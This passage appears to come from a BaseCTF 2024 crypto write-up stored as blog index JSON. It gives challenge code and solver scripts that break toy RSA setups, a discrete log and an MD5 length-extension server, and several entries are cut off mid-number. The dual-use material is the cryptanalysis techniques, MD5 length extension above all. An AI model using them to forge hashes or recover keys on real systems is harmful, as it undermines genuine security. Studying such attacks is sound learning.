prod(A[0])) print(MAT) print(f'c = {c}') print(f'e = {e}') ''' [[9194428734244577957135736828947112370812209206819996917633266069359894211949655026549592464237531352518967649750275097282532736237822915630766535634248987628113137246739472264614337707439494149796414126558156060870508338278038269649101921703583149322486905552569052814106532234864028314925118581658029792157851338427975728108000711353532410024128431635933014226306706319591106081211872 7052600738698435126221697697810087514520765619736355003187836563546493264420232197860875416948961661231812045406188307561458872254314061097960625042149316957446344556490001927621879295417925720004568332344856366002394724202261454916368122811414228043610804718983599804179657247820737462743875143882925818085495573474169110616761320858675303922740882169073395416895304752909979711051264 13094262565727554986668133240216117564284263232131011542877585146452802164148464500319291219458081531317231044962383872061004846788004747813785963603455919882739054992075130196548494850105124430477756818974520035883861936342117869122455996838023977818945511119955390136020375974150407580576040034808588694313922810340598787633148909527275716235390356737099830131958338026891256778602432] [7291452286171544741377496447735677778433522048452394999757158120018504601116506253897733192493798837108269469756414516913436198353934250444263790689101779479157541198872731006007031448329354826004420971505929629537584453480285628607579031078497417101681028600589030661495031531644755072500393418929237208836713910921969937998825721580514845395852889662758886414966066733340052235985735 5592919719754926663830816961667268104316637431189640788304536404157195458040686322901848820171568258023938724485177544141303597034389473064509506247034833050568643394732003598890104462382321956436508366359718039669456303596542945687737870352569084995858128262046585579724537002100295978230177579835256681774512205534970583421138287684468047290246482431883957170924203400422234299829407 10384135162743100269852365857770153822630076412853981379757028821332622753962517667857057209221058533163475030678127399042436975886694593504673386134198042731671320468065688239424934644173240507619471360908786669070898288638067852779718549009532013299792474712979659423962779677856135791013599792822988457540442172903145046394648862567656330868441373023488569784114231877910285319620037] [34946383530632295853235791100380055176686898072752599942691162027311662041417740482507624946631032260410440329949488242706004902881977357811370156793240362927747354453547446315050117795844866771053429455608334265986953931753411938119703800489233043034369650346216548318254326462336573090313788936967898128977445514764945671848611612198443909056919 26805677375585831510259621878357023272222175103906204143689109861471123435549853025410319713500257027420994041712736040084303902812241806295302385126726161281240831030434347236854521776375408982352155894199700974681768432734155312616453345950508256035721377179651166114898547487082749355033867559583905997404388549346221139007108462958001461826337 497689562776640505003875019493739498285890124432122140160880154788261787596989464524950633083323323737282232526131326119044770617177622619274987548499130087479804420987875243597556955199892863044451754402181681450376817910034711","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:2:3","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"random_primes task from Crypto.Util.number import * import random def gen_n(): primes=[getPrime(128) for _ in range(256)] n = 1 for i in range(100): n *= primes[random.randint(0,127)] return primes,n flag=b'BaseCTF{}' m=bytes_to_long(flag) assert len(flag)==45 primes,n = gen_n() e = 0x010001 c=pow(m,e,n) print(\"n =\",n) print(\"e =\",e) print(\"c =\",c) print(\"primes =\",primes) 分析：没啥好说的，直接写就行了，127个随机数中随机抽了100轮，直接用n去%这些随机数，然后算新的n和phi exp n = 78300669134090137852678272985826748552135227276632141248987049792032006306302216838913764274866303353208450204056303587307590215658369546155011362928706987241738494219541640893624036978156512506828463680671263486243620357332029975262649036988429673099480612452108805474703908926666372276084227948945557265663478215385708377783788570365632616043692339165126905185780780266966306548390661933964569191558132570743049563034138454687784280737515786647554373002062073506433019576711216881997114922882459590300118573321037403610889041169358378723253785685185468195113769538654602557963324567374538144099228383454092513581001676844948371535253876783418313588527754932166605066901072445123419390582818421290114496685300926300428214457517990285819930164112928731952543551128353453115448896272534889430898972420106066951673716649898254901175990616932072274131352817500432771246120044877003878221635833566879303044541045834038388997926347179939044765998585225912825579716411592564742018931576637831147018364052669287568321730785094397048548966924521616592554123755297954204221563101170233500051950508111908253332306439556638016218903032470713009804240601585082087048162066169084662644707376647151608352036058459491394516846894878416951958668053255135013274125427380981145860643060541753558111657169642936860264070256441807766713460296249602643758686033797758071121020245797758472562524923801634553187959279204425077723939301840341779998492203869115635533331664608105795918593153796830400602836307602218542060655621724654663459491663959746624660378618696497713505280314029154654750144247111545203758654611758984447921004347657793617842564871769622784844341157861486787088384957424536581508067582989224734241742351249915951485225249670040001204171856547596397427658888879993013652971335861824416084725435327931256774534973698438003593122194474117269397752225948596514379988893089239094703410940035417268946100231522267605729519374566776171026410423486906556493370843386314649478106704968479881781695360132024826936593194324539644886241562342997299649076507105518992946223028855705189458007533521138703343150937158114114218932400728424949936286443583797118636171187082834662757985896337364138817400612718422265665198024836586611857266616428913152399750688461692677751727389476785588380514444593900569311496880422405988762554852121131345538798688587092154717384294801026132314002251890156123191210398076704434510182202143578810771596233936298462366674592585338029819643973999567268938697218329734244529139548760101393715777276776940762681748317493543343685273831243829694914274003574509516149595004243952747746644961308054952235256037171151695870643020625268635139422461824974663101258586488528601193378268634713686606488503649923013225514905688326248009253372769118830036659383418890729585564557376820890036155588551064419189532686009173215470250197488274429655669070803391973941917017493224972246331391152287082983301776505925295294164201606063028946348118492358755684668733095242911870636074134633575423928967453742150728552560370847186174905012586984090885433727025000206871702482359563400504600567763564582739694873656581728461491373440639163666040518508819641244084238867282549191870081112768586762540287977817548140346798817430775010275964061529114139424317686620296832033309265702409802876815255731607798400127673166880859281784259402995434972992131101158600882460475931695668710417351337637612478180964570698492610372677176847071937542439765750578751925220375723373827393178629810215549480885217514819316424426943459039642952096990941480059597449017550988311939357225","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:2:4","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"two_squares task from Crypto.Util.number import * flag=b'BaseCTF{}' m=bytes_to_long(flag) p=getPrime(128) q=getPrime(128) n=p*q e=65537 c=pow(m,e,n) x=p^2+q^2 print(\"e =\",e) print(\"c =\",c) print(\"x =\",x) \"\"\" e = 65537 c = 42330675787206041757903427737108553993012805007294570657461042152628982126538 x = 209479773119142584969854470862023704936857416491817498021871883305658177375498 \"\"\" 分析：最简单的一个，sagemath里面有two_squares的函数，甚至还有3次方的 exp e = 65537 c = 42330675787206041757903427737108553993012805007294570657461042152628982126538 x = 209479773119142584969854470862023704936857416491817498021871883305658177375498 #p,q=two_squares(x) #print(p,q) p=312730551067949919826003024531506165487 q=334184642896526518753506901808151350573 from Crypto.Util.number import * n=p*q m=pow(c,inverse(e,(p-1)*(q-1)),n) print(long_to_bytes(m)) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:2:5","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"try_to_factor task from Crypto.Util.number import * import random flag=b'BaseCTF{}'+random.randbytes(64) m=bytes_to_long(flag) p,q,r,s,t=[getStrongPrime(512) for _ in range(5)] N=p*q*r*s*t n=p*q e=65537 c=pow(m,e,n) gift=random.randint(2,n)*(p-1)*(q-1)*(r-1)*(s-1)*(t-1) while gift%2==0: gift//=2 print(\"N =\",N) print(\"c =\",c) print(\"gift =\",gift) \"\"\" N = 162692163428762295773992659007654377270271126313772302197255271375236131917158614424426498628778734679898165422129699410934825650141972454562350664161510689489443251515884304101827584411577749250383438126881931889798597627663578045519256806107514170414321556291545302688028088470848270636776466672843710163017531472049823632822203461654253767303314505996071453898533003519236112138591066133289040889933161978131399309340741554076140734156174295730180874473301361701867633594222054688204666518058106672165786417002466165926062199279674267145233283545524775943767021416906072142236079753359492846480515376121887507681663761713445807717270089017438999615422884163666812016989696908657065537508715229685120221307021151610089917537155165897740417480127289719971512938348936259 c = 113962118676826667648935023618252851875440854724310328843964819392166304653581141146631375503931008732348730639629174670963727399860571217264854300057305570824097216782800531930906801885967717639795643406206813677461127762087560021634738167845077869308515223303820469892552545806179267969169748886980836435095 gift = 863514692222931709925579242743251211976114217396765747601042357918763818732391790491059528595917786523674732369068315533549380754409535403506339052401422249684188032949680148055803474336983973622610403448963752802490806614810077181934627694570685722842963961551889267501616799757825675192653489096007790143775773378495299981666657347802233798206597104474595281241837323214457344961462510183726339545608046357281265026013496037522835659867389206279894057481600882665189079672009577651494435000349624334685832217586703242422260870866432379257259316411280539845741932725104662417642890238587876489774492067722351467773093391502588019563488688309892102039611978767690653206664257400163618467825666105966072942726011447079204869750153256054140924951306811971422635104088608275908232688385437145325481792836532453258784103533536292492138405929815964841772656055397705840797739586953744563989819811944946916720655079908564653686456283647030055622241840292127096994325415897266379446446435164189216562921252341705747891518007710533906231225283309180960546212899099652226954393826875 \"\"\" 分析：本来这应该是n和phi已知直接去套模板分解的，但是naby师傅魔改了一下，将phi中的2除完了，那就导致无法直接使用，然后给了一个论文，在里面讲了一个算法，自己没有看到太懂，大概的意思是我们要找的是非平凡平方根，那么这个数用a来表示，就是 $$ a^2-1=(a+1)(a-1)=0 mod N ,(a+1)(a-1)=kN $$那么我们求解直接已知一个另一个gcd就好了 exp from Crypto.Util.number import * N = 162692163428762295773992659007654377270271126313772302197255271375236131917158614424426498628778734679898165422129699410934825650141972454562350664161510689489443251515884304101827584411577749250383438126881931889798597627663578045519256806107514170414321556291545302688028088470848270636776466672843710163017531472049823632822203461654253767303314505996071453898533003519236112138591066133289040889933161978131399309340741554076140734156174295730180874473301361701867633594222054688204666518058106672165786417002466165926062199279674267145233283545524775943767021416906072142236079753359492846480515376121887507681663761713445807717270089017438999615422884163666812016989696908657065537508715229685120221307021151610089917537155165897740417480127289719971512938348936259 c = 113962118676826667648935023618252851875440854724310328843964819392166304653581141146631375503931008732348730639629174670963727399860571217264854300057305570824097216782800531930906801885967717639795643406206813677461127762087560021634738167845077869308515223303820469892552545806179267969169748886980836435095 gift = 8635146922229317099255792427432512119761142173967657476010423579187638187323917904910595285959177865236747323690683155335493807544095354035063390524","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:2:6","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"week3の题目 ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:3:0","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"没有n啊 task from Crypto.Util.number import * import gmpy2 flag=b'BaseCTF{}' m=bytes_to_long(flag) p=getPrime(512) q=getPrime(512) n=p*q e=65537 phi=(p-1)*(q-1) d=gmpy2.invert(e,phi) c=pow(m,e,n) x=pow(n,e,c) print(\"c =\",c) print(\"e =\",e) print(\"d =\",d) print(\"x =\",x) ''' c = 52453423663797600504896811946820841317615798875871627840172711423749946998217916744135290476795328543876098295227017753117609268701786914053599060330837226980969490439739651088710549890669593587642238827462108900683237797139569260570711611781514337884756698142193277516649805710242748531658979160170193283558 e = 65537 d = 54297831548863701092644190086258072883163378307246681513317422545902442650340916001357605211715836911877651782099787873046987096258918495734824011752504203578982947618784736181975847356304742402103468329660346526185908618978851982007496096394151821403282347897417590596861323293706611997134962231129075032641 x = 40635864473997460751766935373772107585133301579524000836637683731949939348171187931595274511243052505604832873086269554842194695737052043633079044688826020656068356561856848814530947955429343483847291398607359454851926470168457852479044154798114087493843073091985855839008222762224952503563764527380033064437 ''' 思路：西瓜杯的原题，二项式定理 exp from Crypto.Util.number import * phic=euler_phi(c) dc=inverse_mod(e,phic) a=pow(hint,dc,c) n=int(a)+int(c) m=power_mod(c,d,n) print(long_to_bytes(m)) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:3:1","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"没有n啊pro task from Crypto.Util.number import * import gmpy2 flag=b'BaseCTF{}' m=bytes_to_long(flag) p=getPrime(128) q=getPrime(128) print(p,q) n=p*q e=65537 phi=(p-1)*(q-1) d=gmpy2.invert(e,phi) assert d\u003cphi c=pow(m,e,n) print(\"c =\",c) print(\"e =\",e) print(\"d =\",d) \"\"\" c = 78919950899709764543039048006935881842075789773495004639436106636461009323420 e = 65537 d = 13002488326322253055272696035053386340217207134816593767440035447757509399233 \"\"\" 思路：分解之后去和他爆了 exp from Crypto.Util.number import long_to_bytes c = 78919950899709764543039048006935881842075789773495004639436106636461009323420 e = 65537 d = 13002488326322253055272696035053386340217207134816593767440035447757509399233 def find(factors): dic={1:[]} for factor in factors: for f in list(dic.keys()): ff=f*factor if ff not in dic: dic[ff]=dic[f]+[factor] return dic for k in range(2,e): if (e*d-1)%k==0: phi=(e*d-1)//k if phi.nbits()==256 and d\u003cphi and phi\u003ec: fac=list(factor(phi)) factors=[] for f in fac: ep=f[1] for _ in range(ep): factors.append(f[0]) dic=find(factors) for p_1 in list(dic.keys()): pp=p_1+1 if is_prime(p_1+1) and pp.nbits()==128: q_1=phi//p_1 if is_prime(q_1+1): print('find!') p=p_1+1 q=q_1+1 m=power_mod(c, d,p*q) print(long_to_bytes(m)) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:3:2","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"exgcd task from Crypto.Util.number import * flag=b'BaseCTF{}' m=bytes_to_long(flag) p=getPrime(1024) q=getPrime(1024) n=p*q e1=3747 e2=2991 c1=pow(m,e1,n) c2=pow(m,e2,n) print(\"n =\",n) print(\"e1 =\",e1) print(\"e2 =\",e2) print(\"c1 =\",c1) print(\"c2 =\",c2) \"\"\" n = 27855350163093443890983002241607629119744539643165776358993469078731521668677421483556132628708836721737685936980427467856642738196111748018522018598646125626995613169001111504706363742194664774823604738939411512861441742683157275818500991834651769368178320088982759626122029956515159435424882855075032400667120376075618896752694718491438251810609878021717559466498493103257912108879328270813061231904227056671621363669388496383136964549879459562004569059185078204867346250733489663015417879915436157806942021693920206071715538430633494012923651469196048546309592946901609803631751035364478773126967010589504275776307 e1 = 3747 e2 = 2991 c1 = 24426579024062518665031958216110619832653602343205488454298659533869220501923184793828421371206493659949730138867555889074137026401207985428160803910695088081370233571905915349589146504374710444468715701305061060934519410886010929009297226496448218819742287990364436349188987723637449590579092391100714056589967894609950537021838172987840638735592599678186555961654312442380755963257875487240962193060914793587712733601168204859917001269928487633954556221987632934190217367502677285906521385169669644977192556145782303526375491484736352799180747403161343130663661867413380222714012960607473395828938694285120527085083 c2 = 6932145147126610816836065944280934160173362059462927112752295077225965836502881335565881607385328990881865436690904056577675885697508058289570333933837515526915707121125766720407153139160751343352211421901876051228566093038929625042619250168565502734932197817082848506826847112949495527533238122893297049985517280574646627011986403578166952789317461581409161873814203023736604394085875778774834314777046086921852377348590998381648241629124408514875110073073851913857329679268519229436092660959841766848676678740851087184214283196544821779336090434587905158006710112461778939184327386306992082433561460542130441825293 \"\"\" 思路：共模攻击，但是gcd(e1,e2)=3，再开根号 exp from gmpy2 import* from Crypto.Util.number import * def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) n = 27855350163093443890983002241607629119744539643165776358993469078731521668677421483556132628708836721737685936980427467856642738196111748018522018598646125626995613169001111504706363742194664774823604738939411512861441742683157275818500991834651769368178320088982759626122029956515159435424882855075032400667120376075618896752694718491438251810609878021717559466498493103257912108879328270813061231904227056671621363669388496383136964549879459562004569059185078204867346250733489663015417879915436157806942021693920206071715538430633494012923651469196048546309592946901609803631751035364478773126967010589504275776307 e1 = 3747 e2 = 2991 c1 = 24426579024062518665031958216110619832653602343205488454298659533869220501923184793828421371206493659949730138867555889074137026401207985428160803910695088081370233571905915349589146504374710444468715701305061060934519410886010929009297226496448218819742287990364436349188987723637449590579092391100714056589967894609950537021838172987840638735592599678186555961654312442380755963257875487240962193060914793587712733601168204859917001269928487633954556221987632934190217367502677285906521385169669644977192556145782303526375491484736352799180747403161343130663661867413380222714012960607473395828938694285120527085083 c2 = 6932145147126610816836065944280934160173362059462927112752295077225965836502881335565881607385328990881865436690904056577675885697508058289570333933837515526915707121125766720407153139160751343352211421901876051228566093038929625042619250168565502734932197817082848506826847112949495527533238122893297049985517280574646627011986403578166952789317461581409161873814203023736604394085875778774","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:3:3","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"ez_log task from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b, getPrime from Crypto.Cipher import AES from random import randint flag = b\"flag{test_flag}\" pad = lambda x: x+b'\\x00'*(16-len(x)%16) def encrypt(KEY): cipher= AES.new(KEY,AES.MODE_ECB) encrypted =cipher.encrypt(flag) return encrypted def decrypt(KEY): cipher= AES.new(KEY,AES.MODE_ECB) decrypted =cipher.decrypt(enc) return decrypted flag = pad(flag) x = randint(10 ** 7, 10 ** 8) y = randint(10 ** 7, 10 ** 8) n = getPrime(28) z = pow(y, x, n) enc = encrypt(pad(l2b(x))) print(f'enc = {b2l(enc)}') print(f'y = {y}') print(f'n = {n}') print(f'z = {z}') ''' enc = 33416570913716503492297352041317858420349510954381249751537743898024527101872454706181188441210166165803904185550746 y = 82941012 n = 228338567 z = 51306718 ''' 思路：就是离散对数，练一下脚本吧(所以没用sagemath) exp from Crypto.Util.number import long_to_bytes as l2b from Crypto.Cipher import AES from math import isqrt from sympy import mod_inverse # 已知值 y = 82941012 n = 228338567 z = 51306718 def baby_step_giant_step(y, z, n): # m 为 sqrt(n) 的上界 m = isqrt(n) + 1 # 计算 Baby steps: (y^j) % n for j in range(m) baby_steps = {} current = 1 for j in range(m): baby_steps[current] = j current = (current * y) % n # 计算 Giant steps: (z * y^(-m))^i % n y_m_inv = mod_inverse(pow(y, m, n), n) # y^-m (mod n) giant_step = z for i in range(m): if giant_step in baby_steps: return i * m + baby_steps[giant_step] giant_step = (giant_step * y_m_inv) % n return None # 未找到 x = baby_step_giant_step(y, z, n) if x is not None: print(f'Found x: {x}') else: print('No solution found') if x is not None: KEY = l2b(x) + b'\\x00' * (16 - len(l2b(x)) % 16) enc = 33416570913716503492297352041317858420349510954381249751537743898024527101872454706181188441210166165803904185550746 cipher = AES.new(KEY, AES.MODE_ECB) decrypted_flag = cipher.decrypt(l2b(enc)) print(f'Decrypted flag: {decrypted_flag}') ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:3:4","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"wiener task from Crypto.Util.number import * import decimal flag=b\"BaseCTF{}\" m = bytes_to_long(flag) p = getPrime(1024) q = getPrime(1024) n=p*q e=65537 c=pow(m,e,n) print(\"e =\",e) print(\"c =\",c) decimal.getcontext().prec = 648 P=decimal.Decimal(p) Q=decimal.Decimal(q) leak=decimal.Decimal((3*P*Q-1)/(3*Q*Q)) print(\"leak =\",leak) \"\"\" e = 65537 c = 11032748573623426359632659657114807044712138586316710250985606809252700461490504487308849626514319062562557448839550994242999334882617031487618174168038491566640081840111747765753878087564318833273878755416584962921669911444225959335274753391800995531023212276838665202257007640354237043291129197348884914956663597240094662207929658519596987351984403258345205873566463643624175318315064440456858013874962784792564480286904620663695194689839431808082976248378509181327101557380978849545906691903896662095520288964101796965095129861467059775556110616007889846240936219381379219605528051627402300580239311202137582442057 leak = 0.829374344780877053838760251345359097311540811993463349625630085472892814959843248358036249898871908548743719153319438638517170060651237635838827482534816419091949205584951292517303330452910012749674475329235689229498752425379611083979518257734473992186831474208400813283887045691145481237726578827559198828469462343342343287720369159899636816373592067698883361360269728719786071024354151682314608072902347335691012713629816579496252896260869382806838857194293618332286500427694077400072428506897829689703872985954772105672992293334668485358785863779749153981721900135318166811250762946069962348114491411585418993494561587403918162681937152503739843 \"\"\" 思路：直接pq连分数，去爆破或者是搜索都行 exp from gmpy2 import * from Crypto.Util.number import * e = 65537 c = 11032748573623426359632659657114807044712138586316710250985606809252700461490504487308849626514319062562557448839550994242999334882617031487618174168038491566640081840111747765753878087564318833273878755416584962921669911444225959335274753391800995531023212276838665202257007640354237043291129197348884914956663597240094662207929658519596987351984403258345205873566463643624175318315064440456858013874962784792564480286904620663695194689839431808082976248378509181327101557380978849545906691903896662095520288964101796965095129861467059775556110616007889846240936219381379219605528051627402300580239311202137582442057 leak = 0.829374344780877053838760251345359097311540811993463349625630085472892814959843248358036249898871908548743719153319438638517170060651237635838827482534816419091949205584951292517303330452910012749674475329235689229498752425379611083979518257734473992186831474208400813283887045691145481237726578827559198828469462343342343287720369159899636816373592067698883361360269728719786071024354151682314608072902347335691012713629816579496252896260869382806838857194293618332286500427694077400072428506897829689703872985954772105672992293334668485358785863779749153981721900135318166811250762946069962348114491411585418993494561587403918162681937152503739843 con=continued_fraction(leak) for i in range(0, len(con)): q = con.denominator(i) p = con.numerator(i) if is_prime(q) and is_prime(p): print(long_to_bytes(power_mod(c, inverse(e, q-1),q))) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:3:5","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"week3の题目 ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:4:0","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"哎呀数据丢失了 task -----BEGIN RSA PRIVATE KEY----- MIICXAIBAAKBgQC9J4SEEirvmmnsZHKQIZ3tBu3St2EXIbMmhQsvUGDa7tdpQ1Zm fEecqcy2lp9Pvm3H+mdZrKIdipaogajkoCF3MnV+ZJ1QMZFRH6ltpC7R2i+jvIyc ZfvZwN1vQwNZrEXkVdMsWw6inSHmR/+A5Qq8u4D3attnAHoE6F2660yPHQIDAQAB AoGAImXjVVkwca41AQYrR0a1v3r5GM68W0aHm8OqCwqk8mtoxP234p9LLpQ6ZCH0 Cr5onGtPDCG2wYSIbVBW9GyiaQhUDsB7gq1H5meXGgH6xhYuk6f8Ya7VZg+Cauuj TXiszRj8WeeSFwHxD/UdUog3BrhkKHz9s04wnJOCnSnYZ8kCQQDG4J********** **************************************************************** **************************************************************** **************************************************************** **************************************************************** **************************************************************** **************************************************************** **************************************************************** -----END RSA PRIVATE KEY----- c=5350934245443624615705634168321364454795591666560826831012326948814964674913623395481194876787286689366750529186073548501661956439774413391667376304378756290912469006122113210585561764352070241110069022406544206322583369771609766119501319329839086445136604208397605143623014788767486449680728261586601862940 思路：经典的部分pem丢失，整体转16进制后按照02分割 exp 30 82 025c 0201 00 n 028181 0x00bd278484122aef9a69ec647290219ded06edd2b7611721b326850b2f5060daeed7694356667c479ca9ccb6969f4fbe6dc7fa6759aca21d8a96a881a8e4a0217732757e649d503191511fa96da42ed1da2fa3bc8c9c65fbd9c0dd6f430359ac45e455d32c5b0ea29d21e647ff80e50abcbb80f76adb67007a04e85dbaeb4c8f1d e 0203 0x010001 d 028180 0x2265e355593071ae3501062b4746b5bf7af918cebc5b46879bc3aa0b0aa4f26b68c4fdb7e29f4b2e943a6421f40abe689c6b4f0c21b6c184886d5056f46ca26908540ec07b82ad47e667971a01fac6162e93a7fc61aed5660f826aeba34d78accd18fc59e7921701f10ff51d52883706b864287cfdb34e309c93829d29d867c9 024100c6e0 e=0x10001 d=0x2265e355593071ae3501062b4746b5bf7af918cebc5b46879bc3aa0b0aa4f26b68c4fdb7e29f4b2e943a6421f40abe689c6b4f0c21b6c184886d5056f46ca26908540ec07b82ad47e667971a01fac6162e93a7fc61aed5660f826aeba34d78accd18fc59e7921701f10ff51d52883706b864287cfdb34e309c93829d29d867c9 n=0xbd278484122aef9a69ec647290219ded06edd2b7611721b326850b2f5060daeed7694356667c479ca9ccb6969f4fbe6dc7fa6759aca21d8a96a881a8e4a0217732757e649d503191511fa96da42ed1da2fa3bc8c9c65fbd9c0dd6f430359ac45e455d32c5b0ea29d21e647ff80e50abcbb80f76adb67007a04e85dbaeb4c8f1d c=5350934245443624615705634168321364454795591666560826831012326948814964674913623395481194876787286689366750529186073548501661956439774413391667376304378756290912469006122113210585561764352070241110069022406544206322583369771609766119501319329839086445136604208397605143623014788767486449680728261586601862940 from Crypto.Util.number import * m=pow(c,d,n) print(long_to_bytes(m)) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:4:1","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"rabin task from Crypto.Util.number import * flag=b\"BaseCTF{}\" m = bytes_to_long(flag) p = getPrime(512) q = getPrime(512) assert p%4==3 and q%4==3 n = p*q e = 4 c = pow(m,e,n) print(\"p=\",p) print(\"q=\",q) print(\"n=\",n) print(\"c=\",c) print(\"e=\",e) \"\"\" p= 8531212975719216550108614256955774722172741885676113601617182716356239301381951899737237219659253655889636684200345109462928796329670321336864298557778843 q= 7443256287912111739335729314443559886458007838130371799255078565502662459436043455787869631999073617967343884377537828940738213460508765519478956421282871 n= 63500004625039456439237191267891267558404574431112995926594213383621331385226487443753506088788203040258384788149958095020759745138424276657604371402824844725005596890673468964961037168078105356669148960568974603581485045691990626520286184874115519591663033533771400334558853058140717812903874350138362098253 c= 51452608438757130697131508192775727191605112918772187364577097224326062184288501602000700342623122861398852536963355962672293705131887315354242193416090384360837672258861475017098419459125395949090523474744886423754439919504732741712693909507972791203801494594878447921609420574365853676576693694677914169353 e= 4 \"\"\" 思路：经典rabin板子，不会的去搜原理 exp from Crypto.Util.number import * from gmpy2 import iroot, invert p= 8531212975719216550108614256955774722172741885676113601617182716356239301381951899737237219659253655889636684200345109462928796329670321336864298557778843 q= 7443256287912111739335729314443559886458007838130371799255078565502662459436043455787869631999073617967343884377537828940738213460508765519478956421282871 n= 63500004625039456439237191267891267558404574431112995926594213383621331385226487443753506088788203040258384788149958095020759745138424276657604371402824844725005596890673468964961037168078105356669148960568974603581485045691990626520286184874115519591663033533771400334558853058140717812903874350138362098253 c= 51452608438757130697131508192775727191605112918772187364577097224326062184288501602000700342623122861398852536963355962672293705131887315354242193416090384360837672258861475017098419459125395949090523474744886423754439919504732741712693909507972791203801494594878447921609420574365853676576693694677914169353 e= 4 inv_p = invert(p, q) inv_q = invert(q, p) mp = pow(c, (p + 1) // 4, p) mq = pow(c, (q + 1) // 4, q) a = (inv_p * p * mq + inv_q * q * mp) % n b = n - int(a) c = (inv_p * p * mq - inv_q * q * mp) % n d = n - int(c) # 因为rabin 加密有四种结果，全部列出。 aa = [a, b, c, d] for i in aa: # print(i) print(long_to_bytes(int(iroot(i,2)[0]))) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:4:2","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"extendmd5 task from Crypto.Util.number import * import hashlib import socketserver import signal import os import random flag = os.getenv('GZCTF_FLAG') class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b'' while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u003c BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b'\\n' self.request.sendall(msg) except: pass def recv(self): return self._recvall() def my_md5(self,text): mymd5=hashlib.md5() mymd5.update(text) return mymd5.hexdigest() def handle(self): signal.alarm(30) c=random.randint(1,64) want=random.randbytes(c) want_md5=self.my_md5(want) self.send(want_md5.encode()) while True: self.send(b\"\\nPlease input the secret:\") secret = self.recv() final=want+secret final_md5=self.my_md5(final) self.send(b\"\\nPlease input your md5:\") your_md5=self.recv().decode() if final_md5 == your_md5: self.send(flag.encode()) break self.send(b\"\\nConnection has been closed =.= \") self.request.close() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \"__main__\": HOST, PORT = '0.0.0.0', 9999 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 思路：密码里面的md5拓展，不是web的！但是要解一百次。 此处用naby师傅的exp：原理： 首先需要从md5加密过程开始说起，md5加密是分组进行加密的，每组512bits。在一开始，需要对明文进行填充，如果最后分组不满512bits的需要填充到512bits；如果原始内容刚刚好可以分组，那也需要填充一个512bits的分组。md5扩展攻击最重要的就是理解填充规则。 填充规则： 首先添加一个固定字节b’\\x80’，之后需要填充由原始明文长度计算得来的8个字节，这8个字节是一定需要填充的，所以如果这个时候明文已经到达了57bytes，再填充8字节就会不再是刚好的64bytes(512bits)，所以这时候我们要新添一个分组。最后八字节为原始明文长度，填充方式为小端序。 比如len=10，先填上个b’\\x80’，这时候长度为11，可以填充8字节，那么再填充b’\\x00’*(64-8-1-10)，64为一个分组的字节数，8为最后需要填充的数据，1是最开始填充的b’\\x80’，最后填充八个字节为b’\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00’。 比如len=33，先填上个b’\\x80’，那么再填充b’\\x00’*(64-8-1-33)，最后填充八个字节为b’\\x08\\x01\\x00\\x00\\x00\\x00\\x00\\x00’。原始数据为264bits，验证：0x108=264 比如len=56，先填上个b’\\x80’，这时候有57字节，再填充8字节的话为65字节，那么不满足分组条件，所以这时候我们需要再填充b’\\x00’(642-8-1-56)，也就是63个0字节，最后填充八个字节为b’\\xc0\\x01\\x00\\x00\\x00\\x00\\x00\\x00。原始数据为448bits，验证：0x01c0=448 当我们填充完数据后，从第一个分组开始进行md5加密，加密过程可以不用在意，只需知道每次加密后得到32个16六进制，加密后的结果分成四组，当成下一个分组加密的IV，这是攻击的关键。 一开始，我们知道原始内容的md5值，并且原始内容长度小于64字节。这时候，服务器我们可以在原始内容后面添加自定义数据，那么最重要的就是，根据填充规则，我们只要知道原始内容长度，我们就可以自己进行填充，只要我们自己填充的数据与md5加密时一样，最后计算出的md5值也会一样，那么这个结果是作为下一组内容加密时的IV。 所以我们像服务器发送数据为：填充内容+任意内容 最后发送 任意内容的md5结果，当然这里需要根据服务器一开始传来的md5值作为IV来进行加密 